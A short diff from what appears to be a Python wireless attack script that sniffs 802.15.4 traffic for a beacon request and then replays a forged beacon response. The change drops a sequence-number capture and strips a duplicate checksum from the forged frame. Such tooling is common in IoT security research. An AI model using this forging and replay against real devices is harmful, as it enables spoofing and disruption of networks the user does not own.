@@ -119,11 +119,12 @@ if __name__ == '__main__':
                 if (packet_bytes[0] & 0b111 == 0b011 and packet_bytes[7] == 0x07):
                     print('  Got beacon request.')
                     got_beacon_request = True
-                    br_seq_num = packet_bytes[2]
         kb.sniffer_off()
 
         # Update timestamp
         beacon_response_bytes[2] = (beacon_response_bytes[2]+1) % 256
+        # Remove duplicate FCS
+        beacon_response_bytes = beacon_response_bytes[:-2]
 
         # Send forged beacon response
         print('7. Replaying beacon response.')
